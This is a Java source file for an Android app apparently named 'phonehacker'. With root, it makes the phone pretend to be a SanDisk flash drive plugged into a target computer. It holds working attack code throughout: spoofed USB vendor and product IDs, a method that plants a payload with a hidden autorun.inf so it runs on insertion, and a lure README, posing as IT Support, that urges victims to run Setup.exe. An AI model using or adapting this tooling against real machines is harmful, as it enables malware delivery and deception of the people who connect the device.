package com.offensive.phonehacker;

import android.content.Context;
import android.os.Environment;
import android.util.Log;
import java.io.*;
import java.util.*;

/**
 * UsbMassStorage - Emulates USB mass storage device using Android USB Gadget
 * Allows the Android device to appear as a USB drive to target computers
 */
public class UsbMassStorage {
    private static final String TAG = "UsbMassStorage";
    
    // Gadget paths
    private static final String CONFIGFS_PATH = "/config/usb_gadget";
    private static final String GADGET_NAME = "g_mass_storage";
    private static final String BACKING_FILE = "/data/local/tmp/usb_drive.img";
    
    public interface StatusCallback {
        void onStatus(String message);
        void onError(String error);
    }
    
    private Context context;
    private StatusCallback callback;
    private boolean isActive = false;
    private boolean hasRoot = false;
    private String backingFilePath;
    private long storageSize; // in MB
    
    public UsbMassStorage(Context context) {
        this.context = context;
        this.backingFilePath = BACKING_FILE;
        this.storageSize = 128; // Default 128MB
        checkRoot();
    }
    
    public void setCallback(StatusCallback callback) {
        this.callback = callback;
    }
    
    private void checkRoot() {
        try {
            Process p = Runtime.getRuntime().exec("su -c id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String output = reader.readLine();
            hasRoot = output != null && output.contains("uid=0");
            reader.close();
        } catch (Exception e) {
            hasRoot = false;
        }
    }
    
    /**
     * Set the size of the virtual USB drive
     */
    public void setStorageSize(long sizeMB) {
        this.storageSize = sizeMB;
    }
    
    /**
     * Set custom backing file path
     */
    public void setBackingFile(String path) {
        this.backingFilePath = path;
    }
    
    /**
     * Initialize USB mass storage with empty drive
     */
    public boolean initialize() {
        if (!hasRoot) {
            logError("Root access required for USB mass storage emulation");
            return false;
        }
        
        try {
            // Create backing file if it doesn't exist
            if (!new File(backingFilePath).exists()) {
                logStatus("Creating backing file (" + storageSize + "MB)...");
                createBackingFile();
            }
            
            // Setup USB gadget for mass storage
            if (!setupMassStorageGadget()) {
                return setupLegacyMassStorage();
            }
            
            isActive = true;
            logStatus("USB mass storage active");
            return true;
            
        } catch (Exception e) {
            logError("Failed to initialize: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Create backing file for USB drive image
     */
    private void createBackingFile() throws Exception {
        // Create sparse file
        execRoot("dd if=/dev/zero of=" + backingFilePath + " bs=1M count=0 seek=" + storageSize);
        
        // Format as FAT32
        execRoot("mkfs.vfat " + backingFilePath);
        
        logStatus("Backing file created and formatted");
    }
    
    /**
     * Setup USB gadget using ConfigFS
     */
    private boolean setupMassStorageGadget() throws Exception {
        String gadgetPath = CONFIGFS_PATH + "/" + GADGET_NAME;
        
        // Remove existing gadget if any
        try {
            execRoot("echo '' > " + gadgetPath + "/UDC 2>/dev/null");
            execRoot("rm -rf " + gadgetPath + " 2>/dev/null");
        } catch (Exception ignored) {}
        
        // Create gadget directory
        execRoot("mkdir -p " + gadgetPath);
        
        // Set USB device identifiers (look like a USB flash drive)
        execRoot("echo 0x0781 > " + gadgetPath + "/idVendor");  // SanDisk
        execRoot("echo 0x5567 > " + gadgetPath + "/idProduct"); // Cruzer Blade
        execRoot("echo 0x0100 > " + gadgetPath + "/bcdDevice");
        execRoot("echo 0x0200 > " + gadgetPath + "/bcdUSB");
        
        // Create strings
        String stringsPath = gadgetPath + "/strings/0x409";
        execRoot("mkdir -p " + stringsPath);
        execRoot("echo '12345678' > " + stringsPath + "/serialnumber");
        execRoot("echo 'SanDisk' > " + stringsPath + "/manufacturer");
        execRoot("echo 'Cruzer Blade' > " + stringsPath + "/product");
        
        // Create configuration
        String configPath = gadgetPath + "/configs/c.1";
        execRoot("mkdir -p " + configPath);
        execRoot("echo 120 > " + configPath + "/MaxPower");
        
        String configStringsPath = configPath + "/strings/0x409";
        execRoot("mkdir -p " + configStringsPath);
        execRoot("echo 'Mass Storage' > " + configStringsPath + "/configuration");
        
        // Create mass storage function
        String msFunctionPath = gadgetPath + "/functions/mass_storage.usb0";
        execRoot("mkdir -p " + msFunctionPath);
        execRoot("echo 1 > " + msFunctionPath + "/stall");
        
        // Configure LUN (Logical Unit)
        String lunPath = msFunctionPath + "/lun.0";
        execRoot("mkdir -p " + lunPath);
        execRoot("echo " + backingFilePath + " > " + lunPath + "/file");
        execRoot("echo 0 > " + lunPath + "/removable");
        execRoot("echo 0 > " + lunPath + "/cdrom");
        execRoot("echo 0 > " + lunPath + "/ro"); // Read-write
        
        // Link function to configuration
        execRoot("ln -sf " + msFunctionPath + " " + configPath + "/mass_storage.usb0");
        
        // Enable gadget
        String udc = getUdcName();
        if (udc != null) {
            execRoot("echo " + udc + " > " + gadgetPath + "/UDC");
            return true;
        }
        
        return false;
    }
    
    /**
     * Setup using legacy mass storage gadget driver
     */
    private boolean setupLegacyMassStorage() throws Exception {
        logStatus("Trying legacy mass storage driver...");
        
        // Unload existing modules
        execRoot("rmmod g_mass_storage 2>/dev/null");
        
        // Load mass storage gadget module
        execRoot("modprobe g_mass_storage file=" + backingFilePath + 
                 " stall=0 removable=1 idVendor=0x0781 idProduct=0x5567");
        
        Thread.sleep(500);
        isActive = true;
        return true;
    }
    
    /**
     * Get UDC (USB Device Controller) name
     */
    private String getUdcName() {
        try {
            File udcDir = new File("/sys/class/udc");
            String[] udcs = udcDir.list();
            if (udcs != null && udcs.length > 0) {
                return udcs[0];
            }
        } catch (Exception e) {
            logError("Failed to get UDC: " + e.getMessage());
        }
        return null;
    }
    
    /**
     * Add a file to the USB drive
     */
    public boolean addFile(String localPath, String drivePath) {
        if (!isActive) {
            logError("Mass storage not active");
            return false;
        }
        
        try {
            // Mount the backing file
            String mountPoint = "/data/local/tmp/usb_mount";
            execRoot("mkdir -p " + mountPoint);
            execRoot("mount -o loop " + backingFilePath + " " + mountPoint);
            
            // Copy file
            execRoot("cp " + localPath + " " + mountPoint + "/" + drivePath);
            
            // Unmount
            execRoot("umount " + mountPoint);
            
            logStatus("File added: " + drivePath);
            return true;
            
        } catch (Exception e) {
            logError("Failed to add file: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Add payload file with autorun
     */
    public boolean addPayloadWithAutorun(String payloadPath, String payloadName) {
        try {
            String mountPoint = "/data/local/tmp/usb_mount";
            execRoot("mkdir -p " + mountPoint);
            execRoot("mount -o loop " + backingFilePath + " " + mountPoint);
            
            // Copy payload
            execRoot("cp " + payloadPath + " " + mountPoint + "/" + payloadName);
            
            // Create autorun.inf (works on older Windows systems)
            String autorun = "[autorun]\n" +
                            "open=" + payloadName + "\n" +
                            "action=Open folder to view files\n" +
                            "icon=shell32.dll,4\n" +
                            "label=USB Drive\n";
            
            execRoot("echo '" + autorun + "' > " + mountPoint + "/autorun.inf");
            
            // Make files hidden
            execRoot("attrib +h " + mountPoint + "/autorun.inf 2>/dev/null || true");
            
            execRoot("umount " + mountPoint);
            
            logStatus("Payload added with autorun");
            return true;
            
        } catch (Exception e) {
            logError("Failed to add payload: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Add a deceptive document with embedded payload
     */
    public boolean addTrojanDocument(String documentType) {
        try {
            String mountPoint = "/data/local/tmp/usb_mount";
            execRoot("mkdir -p " + mountPoint);
            execRoot("mount -o loop " + backingFilePath + " " + mountPoint);
            
            // Create directories to look legitimate
            execRoot("mkdir -p " + mountPoint + "/Documents");
            execRoot("mkdir -p " + mountPoint + "/Photos");
            execRoot("mkdir -p " + mountPoint + "/Videos");
            
            // Add README with social engineering
            String readme = "IMPORTANT: Please run Setup.exe to view encrypted files.\n" +
                           "Password: company2024\n\n" +
                           "If you have any issues, contact IT Support.\n";
            execRoot("echo '" + readme + "' > " + mountPoint + "/README.txt");
            
            execRoot("umount " + mountPoint);
            
            logStatus("Trojan document structure created");
            return true;
            
        } catch (Exception e) {
            logError("Failed: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Stop USB mass storage
     */
    public void stop() {
        if (!isActive) return;
        
        try {
            String gadgetPath = CONFIGFS_PATH + "/" + GADGET_NAME;
            execRoot("echo '' > " + gadgetPath + "/UDC 2>/dev/null");
            
            // Try legacy unload
            execRoot("rmmod g_mass_storage 2>/dev/null");
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping: " + e.getMessage());
        }
        
        isActive = false;
        logStatus("Mass storage stopped");
    }
    
    /**
     * Delete backing file
     */
    public void cleanup() {
        stop();
        try {
            execRoot("rm -f " + backingFilePath);
            logStatus("Cleaned up backing file");
        } catch (Exception e) {
            logError("Cleanup failed: " + e.getMessage());
        }
    }
    
    private String execRoot(String command) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", command});
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        p.waitFor();
        return output.toString();
    }
    
    private void logStatus(String message) {
        Log.d(TAG, message);
        if (callback != null) callback.onStatus(message);
    }
    
    private void logError(String message) {
        Log.e(TAG, message);
        if (callback != null) callback.onError(message);
    }
    
    public boolean isActive() {
        return isActive;
    }
    
    public boolean hasRoot() {
        return hasRoot;
    }
}
